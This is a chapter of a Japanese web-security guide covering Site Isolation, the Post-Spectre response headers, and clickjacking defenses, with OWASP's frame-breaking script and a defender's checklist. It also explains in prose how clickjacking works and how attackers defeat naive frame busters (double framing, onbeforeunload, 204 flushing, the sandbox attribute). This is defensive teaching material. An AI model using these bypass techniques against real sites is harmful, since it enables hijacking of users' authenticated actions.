**ハンター視点**: 「Networkパネルに出ていないから通信していない」は誤りです。ページ遷移直前に送出されるビーコンやテレメトリは、DevToolsの "Preserve log" を有効にしてもなお取りこぼされることがあります。プロキシ（自分の検証環境で）やネットワークレベルの観測で裏取りするのが確実です。

> 出典: Site Isolation for web developers — https://developer.chrome.com/blog/site-isolation

#### 4.4 Post-Spectre Web Development —— サーバ側で引ける3本の線

Chromium公式は、Site Isolation のある／ないブラウザ双方でコンテンツを守るため、**「Post-Spectre Web Development」のガイドラインに従うこと**を強く推奨しています。具体的なレスポンスヘッダとして挙げられているのは次の3つです。

| ヘッダ | 役割 |
|---|---|
| `Cross-Origin-Resource-Policy`（CORP） | **どのプロセスがこのリソースを読み込めるか**を制御する。`same-origin` / `same-site` / `cross-origin` |
| `Cross-Origin-Opener-Policy`（COOP） | **プロセス境界の追加制御**。`same-origin` にすると、`window.open` 等で開かれた／開いた相手との `window` 参照を切り、別プロセスに追い出せる |
| `Sec-Fetch-*` | サーバ側で**リクエストの発生源を検証**できるようにするフェッチメタデータ（`Sec-Fetch-Site`、`Sec-Fetch-Mode`、`Sec-Fetch-Dest`） |

実務上の最小構成の例:

```http
# 機微なAPIレスポンス／ユーザ固有の画像などに
Cross-Origin-Resource-Policy: same-origin
X-Content-Type-Options: nosniff
Content-Type: application/json; charset=utf-8

# トップレベルドキュメントに（SharedArrayBuffer等が必要なら COEP と併用）
Cross-Origin-Opener-Policy: same-origin
```

**なぜCORPが効くのか**: CORBが「ブラウザがヒューリスティックで機微そうなものを守る」仕組みなのに対し、CORPは**サーバ自身が「これは他サイトのプロセスに渡すな」と宣言する**仕組みです。ヒューリスティック（スニッフィング）に依存しないので、画像やスクリプトのような「CORBが守れないタイプ」も守れます。つまり CORB／ORB のベストエフォート性を、サーバ側の明示宣言で補う関係にあります。

**`Sec-Fetch-*` によるサーバ側検証の例**:

```
GET /api/me HTTP/1.1
Sec-Fetch-Site: cross-site      ← 他サイトからの読み込み
Sec-Fetch-Mode: no-cors         ← <img>/<script> 等での埋め込み
Sec-Fetch-Dest: image           ← 画像として使おうとしている
```

JSON APIに対してこの組み合わせが来たら、それは正当な利用ではありません（Resource Isolation Policyとして拒否できる）。CSRFやクロスサイトのデータ吸い出しに対する、Origin/Refererより堅い判定材料になります。

> 出典: Site Isolation（Chromium） — https://www.chromium.org/Home/chromium-security/site-isolation/

---

### 5. クリックジャッキング（UI redress）—— 「埋め込ませない」防御

ここまでは「データを攻撃者のプロセスに渡さない」話でした。クリックジャッキングは逆向きで、「**攻撃者のページの中に、あなたのページを（ユーザのCookie付きで）埋め込まれる**」ことが出発点です。

#### 5.1 攻撃の構造

OWASPの定義: クリックジャッキング（別名 UI redress attack）は、**フレームやiframe内のコンテンツに要素を重ね合わせ、ユーザに隠れた要素をクリックさせる**攻撃です。

原理は単純です。攻撃者は自分のページに被害サイトを `<iframe>` で読み込み、CSSで `opacity: 0` にして透明化し、その下（または上）に「ここをクリック」と書いた餌を置きます。ユーザは餌をクリックしたつもりで、実際には**被害サイト上のボタン（送金確定、権限付与、連携アプリ承認など）を、自分のログインセッションで押している**ことになります。ブラウザから見れば、これは正真正銘ユーザ本人のクリックなので、CSRFトークンも効きません（リクエストは被害サイト自身のフォームから正しいトークン付きで飛ぶ）。

したがって防御は「リクエストを検証する」側ではなく、「**そもそも埋め込みを許さない**」側で行う必要があります。

#### 5.2 第一の防御: CSP `frame-ancestors`

`frame-ancestors` ディレクティブは、**ブラウザにページのフレーム内レンダリングを拒否させます**。

```http
# すべての埋め込みを禁止（OWASPが既定として推奨）
Content-Security-Policy: frame-ancestors 'none';

# 同一オリジンからの埋め込みのみ許可
Content-Security-Policy: frame-ancestors 'self';

# 複数ドメインを許可
Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com;
```

**なぜ `frame-ancestors` が `X-Frame-Options` より優れるのか**: ①ワイルドカードを含む複数オリジンを列挙できる、②**フレームツリー全体（祖先すべて）**を検査対象にするので入れ子フレームでも正しく動く、③CSPという統一された仕組みの一部として管理できる、の3点です。

**制限（原典記載）**: 古いブラウザ（Chrome 40、Firefox 35として原典が挙げるもの）は、仕様の要求に反して `frame-ancestors` より `X-Frame-Options` を優先することがあります。現代のブラウザでは `frame-ancestors` が優先されますが、両方を出すのが安全です（矛盾する場合は `frame-ancestors` が勝つ、と覚えておけば運用できます）。

なお `frame-ancestors` は `<meta>` タグでは指定できません。**HTTPレスポンスヘッダでのみ有効**です（ページの一部がレンダリングされた後でフレーム拒否を決めても手遅れだからです）。

#### 5.3 第二の防御: `X-Frame-Options`（XFO）

3つの値があります。

| 値 | 意味 | 評価 |
|---|---|---|
| `DENY` | いかなるフレーミングも禁止 | **推奨** |
| `SAMEORIGIN` | 同一オリジンからのフレーミングのみ許可 | 条件付きで可 |
| `ALLOW-FROM uri` | 特定ドメインからのみ許可 | **廃止済み。現代のブラウザでは fail open（＝無視され、防御が無くなる）** |

`ALLOW-FROM` の「fail open」は特に危険です。`ALLOW-FROM https://partner.example` と書いてあると担当者は「制限できている」と誤解しますが、実際にはヘッダ全体が無視され、**どこからでも埋め込める**状態になります。監査時の定番の指摘項目です。

OWASPが挙げるXFOの制限:

- **ページ単位の設定が必要**で、サイト全体に一括適用する仕組みがない（実際にはWebサーバやリバースプロキシで全レスポンスに付与するのが定石）
- **複数ドメイン許可のシナリオに対応できない**
- `ALLOW-FROM` は非推奨かつ現行ブラウザで機能しない
- **Webプロキシがヘッダを削除してしまうことがある**（企業プロキシ等がヘッダを書き換える環境では防御が消える）
- `SAMEORIGIN` / `ALLOW-FROM` は**トップレベルのコンテキストのみを見る**仕様だったため、入れ子フレーム（攻撃者 → 同一オリジン → 被害ページ）で期待どおり働かないことがある

最後の項目が `frame-ancestors` への移行を決定づけた理由です。ブラウザによっては `SAMEORIGIN` の判定で**直近の親だけ**を見るか**最上位だけ**を見るかが異なり、「攻撃者ページ → 被害サイトの別ページ → 被害ページ」という二段構えで回避される余地がありました。`frame-ancestors` は祖先チェーン全体を検査するので、この穴がありません。

#### 5.4 第三の防御: SameSite Cookie

`SameSite=Strict` または `SameSite=Lax` が付いたCookieは、**クロスオリジンのiframeからのリクエストには送信されません**。クリックジャッキングは「被害者のセッションで操作させる」攻撃なので、セッションCookieが送られなければ、埋め込まれたページは未ログイン状態で表示され、攻撃は成立しません。

ただしOWASPは補助的手段と位置づけています。理由:

- **ユーザが認証されていることが前提の攻撃にしか効かない**（未認証でも意味のある操作があるなら守れない）
- 原典の数字として「**2020年11月時点で約6%のブラウザが未対応**」
- 他の防御と**併用**すべき

（補足・時事性: 2020年以降、Chromeは `SameSite` 未指定のCookieを `Lax` 相当として扱う方針を段階的に展開しました。したがって現代の主要ブラウザでは「明示的に `SameSite=None; Secure` を付けたCookieだけがクロスサイトiframeに送られる」状態が既定です。逆に言えば、埋め込み用途のためにやむを得ず `SameSite=None` にしているサービスでは、この防御層が最初から存在しません。そういうサービスこそ `frame-ancestors` を厳密に設定する必要があります。）

#### 5.5 `window.confirm()` による緩和

どうしてもフレーム可能なままにしなければならない場合、OWASPは `window.confirm()` の利用を挙げています。

**なぜ効くのか**: `confirm()` が表示するダイアログは**フレーム内に埋め込めないブラウザUI**であり、かつ**呼び出し元のドメインを表示します**。攻撃者は透明iframeの上にこのダイアログを隠すことも、見た目を偽装することもできません。ユーザは「いま自分が操作しているのはこのドメインだ」と気づけるため、ソーシャルエンジニアリングへの気づきを与えられます。根本対策ではなく、あくまで「フレーム可能でなければならない」制約下での次善策です。

#### 5.6 レガシー向け frame breaker —— なぜ素朴な実装は破られるか

ヘッダに対応しない古いブラウザ向けに、JavaScriptで「自分がフレーム内にいたら最上位に脱出する」frame buster（フレームバスター）を書く手法があります。しかし**素朴な実装はほぼ確実に破られます**。OWASPが挙げる破り方を、仕組みとともに見ていきます。

**(a) 二重フレーミング（Double Framing）**
攻撃者は被害ページを**2枚のフレームで入れ子に**します。`parent.location = self.location` と書いた frame buster は、`parent`（＝攻撃者が作った中間フレーム）が**クロスオリジンなので `location` への代入がセキュリティ違反となり例外になる**、あるいはナビゲーションが無効化されます。結果、脱出できません。`top.location` を使えば回避できますが、それも次の手で潰されます。

**(b) `onBeforeUnload` ハンドラ**
フレーミング側のページが `beforeunload` ハンドラを登録しておくと、frame buster が `top.location` を書き換えようとした瞬間に、ブラウザが「このページを離れますか？」という確認ダイアログを出します。攻撃者はそのメッセージに「PayPalを終了しますか？」のような偽のテキストを仕込み、ユーザに**キャンセルを押させます**。ユーザがキャンセルすれば、正当な脱出ナビゲーションが取り消されます。

**(c) No-Content フラッシング（204応答の連打）**
攻撃者は `204 No Content` を返すURLへ**繰り返しナビゲーションを発行します**。204はページを遷移させないため、ブラウザはリクエストパイプラインをフラッシュするだけで、**ユーザへのプロンプトなしに、到着中のナビゲーション（＝frame busterの脱出）をキャンセル**できます。(b)のようにユーザの操作を必要としない点でより強力です。

**(d) `sandbox` 属性**
`<iframe sandbox>` は、`allow-scripts` を与えない限り**サブフレーム内のJavaScriptを完全に無効化します**。frame buster はJavaScriptなので、実行されずに終わります。しかも攻撃者は `allow-forms` だけを与える、といった選択が可能なので、**フォーム送信は機能するがスクリプトは死ぬ**という、クリックジャッキングに最適な状態を作れます。Firefox の `designMode` にも類似の効果があります。

> **これが最重要の結論です**: JavaScriptベースの frame buster は、**フレームの外側にいる攻撃者が常に有利**です。攻撃者はフレームツリーの親として、子のナビゲーション・スクリプト実行・イベントを制御できるからです。防御は必ず**ブラウザがレンダリング前に判断できるHTTPヘッダ**（`frame-ancestors` / `X-Frame-Options`）で行い、スクリプトは互換性のための補助に留めてください。

**OWASP推奨の「現時点で最善のレガシー向け frame breaking スクリプト」**:

```html
<style id="antiClickjack">body{display:none !important;}</style>
<script type="text/javascript">
if (self === top) {
    var antiClickjack = document.getElementById("antiClickjack");
    antiClickjack.parentNode.removeChild(antiClickjack);
} else {
    top.location = self.location;
}
</script>
```

**なぜこの形なのか**（ここが設計の妙です）:

1. **CSSで先に `body` を隠す**。`<head>` 内に置くため、`body` がレンダリングされる前に `display: none !important` が適用されます。つまり**デフォルトが「見えない」**状態です。
2. **フレーム内でないと確認できたときだけ、そのstyle要素をDOMから削除して表示する**（`self === top`）。
3. フレーム内なら `top.location = self.location` で脱出を試みる。
4. 仮に(a)〜(d)の手法で**脱出に失敗しても、`body` は隠れたまま**です。クリックジャッキングは「見えている（あるいは透明に重ねられた）UIを押させる」攻撃なので、**押すべきボタンがレンダリングされていなければ攻撃は成立しません**。
5. スクリプトが `sandbox` で殺された場合も、**style要素を削除する処理が走らない**ので `body` は隠れたままです。**フェイルセーフ（失敗時に安全側に倒れる）**設計になっています。

原典が「両方の保護を `<head>` に置くことで、1回の実装で済む」と述べているのはこの点です。

（注意: 当然ながら、JSが無効な正規ユーザにもページが見えなくなります。ヘッダが使える現代環境では、このスクリプトは不要か、明確に古いブラウザを支える必要がある場合の選択肢です。）

#### 5.7 多層防御としてのまとめ

OWASPの推奨をそのまま実装順に並べると:

1. **`Content-Security-Policy: frame-ancestors` または `X-Frame-Options` ヘッダを最優先で設定する**（両方出すのが確実。既定は `frame-ancestors 'none'` ＋ `X-Frame-Options: DENY`）
2. 認証セッションに **SameSite Cookie** を設定する
3. 古いブラウザ互換が要るなら、上記の **frame breaking スクリプト**を `<head>` に入れる
4. フレーム可能でなければならないページでは **`window.confirm()`** で操作ドメインをユーザに提示する

> 出典: Clickjacking Defense Cheat Sheet（OWASP） — https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html

---

### 6. 実務チェックリスト

**防御側（サービス実装者）**

- [ ] 全HTMLレスポンスに `Content-Security-Policy: frame-ancestors 'none'`（埋め込みが必要なら明示的な許可リスト）＋ `X-Frame-Options: DENY`／`SAMEORIGIN`
- [ ] `X-Frame-Options: ALLOW-FROM ...` を使っていないか（使っていたら実質無防備）
- [ ] ユーザ固有・機微な内容を返す全URLに `X-Content-Type-Options: nosniff`
- [ ] JSON/HTML/XMLの `Content-Type` が正確か（CORB/ORBのスニッフィングに頼らない）
- [ ] 機微なリソースに `Cross-Origin-Resource-Policy: same-origin`
- [ ] トップレベルドキュメントに `Cross-Origin-Opener-Policy: same-origin`（`SharedArrayBuffer` 等が必要なら COEP と併用）
- [ ] セッションCookieに `SameSite=Lax`（または `Strict`）＋ `HttpOnly` ＋ `Secure`
- [ ] `Sec-Fetch-Site` / `Sec-Fetch-Dest` によるリソース分離ポリシーの導入検討
- [ ] `target="_blank"` の外部リンクに `rel="noopener"`
- [ ] `unload` 依存の処理を `pagehide` + `sendBeacon` / `fetch(keepalive)` へ移行

**分析側（許可された範囲でのテスト）**

- [ ] 対象ページのレスポンスヘッダに `frame-ancestors` / `X-Frame-Options` があるか。**すべてのページ**にあるか（ページ単位設定の漏れは典型的な欠落）
- [ ] 状態変更を伴う操作（承認、連携、削除、送金確定など）を持つページが埋め込み可能になっていないか
- [ ] 埋め込み可能なページに対し、セッションCookieが `SameSite=None` になっていないか
- [ ] JSON APIが `nosniff` 無し・不正確な `Content-Type` で配信されていないか
- [ ] タスクマネージャ（Shift+Esc）や `chrome://process-internals` で、検証環境のプロセス分離状態を把握しておく

---

### 7. この節のまとめ

- **Spectre は「同じプロセスにあるデータは読まれうる」という前提をWebに突きつけた**。タイマー規制（`performance.now()` の分解能低下、`SharedArrayBuffer` の一時無効化）は対症療法であり、本命は**プロセス分離**である。
- **Site Isolation** は分離の単位を「スキーム＋登録済みドメイン（eTLD+1）」＝**サイト**とし、クロスサイトのドキュメントを OOPIF で別プロセスに置く。デスクトップは Chrome 67 から既定有効（メモリ約10〜13%増）、Android は Chrome 77 から RAM 2GB以上の端末で認証サイト優先（約3〜5%増）。
- **CORB／ORB** は、CORSで許可されないクロスオリジンのデータリソースがレンダラのメモリに入ること自体を防ぐ。ただし**ベストエフォート**なので、開発者側で `Content-Type` の正確化と `nosniff` が必須。
- プロセス分離の副作用として、**クロスオリジンのレイアウトは非同期**になり、**`unload` ハンドラは打ち切られ・並列実行され・実行されないことすらある**。`pagehide` + `sendBeacon` / `keepalive` へ移行する。
- サーバ側で引ける追加の線が **CORP / COOP / `Sec-Fetch-*`**（Post-Spectre Web Development）。ヒューリスティックに頼らず、明示的にプロセス境界を宣言できる。
- **クリックジャッキング**の根本防御は `frame-ancestors`（＋ `X-Frame-Options`）という**ヘッダ**である。`ALLOW-FROM` は fail open で無意味。JavaScript の frame buster は、二重フレーミング・`onBeforeUnload`・204フラッシング・`sandbox` 属性で破られるため、**「デフォルト非表示＋フレーム外でのみ表示」というフェイルセーフ構造**で書く以外に使い道がない。

---

[← 第1章 ブラウザの動作原理とWebプラットフォームの基礎](01-browser-internals.md) ｜ [📖 目次](index.md) ｜ [第3章 JavaScriptの深い理解と読解スキル →](03-javascript-deep-reading.md)
